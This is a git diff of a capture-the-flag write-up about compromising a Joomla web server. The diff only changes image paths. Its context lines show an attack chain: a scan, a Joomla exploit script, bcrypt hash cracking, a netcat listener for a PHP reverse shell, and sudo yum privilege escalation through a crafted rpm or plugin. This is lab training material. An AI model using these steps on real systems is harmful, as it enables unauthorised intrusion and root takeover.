@@ -8,7 +8,7 @@
 
 **Access the web server, who robbed the bank?**
 
-<figure><img src="../../.gitbook/assets/image (24).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>
 
 ### Initial Shell
 
@@ -16,7 +16,7 @@
 nmap -A 10.10.116.159
 ```
 
-![](<../../.gitbook/assets/image (18).png>)
+![](<../../.gitbook/assets/image (18) (2).png>)
 
 
 
@@ -42,7 +42,7 @@ python3 joomblah.py http://10.10.116.159
 john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=bcrypt
 ```
 
-<figure><img src="../../.gitbook/assets/image (24) (3).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (24).png" alt=""><figcaption></figcaption></figure>
 
 We can  now login to Joomla with the credentials we have found
 
@@ -69,7 +69,7 @@ nc -lvp 1234
 
 <figure><img src="../../.gitbook/assets/image (22).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (3) (4).png" alt=""><figcaption></figcaption></figure>
 
 Used this PHP reverse shell, just needed to change the IP to my own.
 
@@ -77,7 +77,7 @@ Used this PHP reverse shell, just needed to change the IP to my own.
 
 <figure><img src="../../.gitbook/assets/image (1) (4).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (4) (2).png" alt=""><figcaption></figcaption></figure>
 
 Get autocomplete
 
@@ -122,7 +122,7 @@ python2 -m SimpleHTTPServer 81
 
 Our fpm file is now created&#x20;
 
-<figure><img src="../../.gitbook/assets/image (2) (5).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (2) (1).png" alt=""><figcaption></figcaption></figure>
 
 **Victim**&#x20;
 
@@ -133,7 +133,7 @@ sudo yum localinstall root-1.0-1.noarch.rpm
 sudo -i
 ```
 
-<figure><img src="../../.gitbook/assets/image (19).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (19) (2).png" alt=""><figcaption></figcaption></figure>
 
 #### **Option #2 -** Spawn interactive root shell by loading a custom plugin
 
@@ -167,5 +167,5 @@ EOF
 sudo yum -c $TF/x --enableplugin=y
 ```
 
-<figure><img src="../../.gitbook/assets/image (1) (6).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (1) (2).png" alt=""><figcaption></figcaption></figure>
 
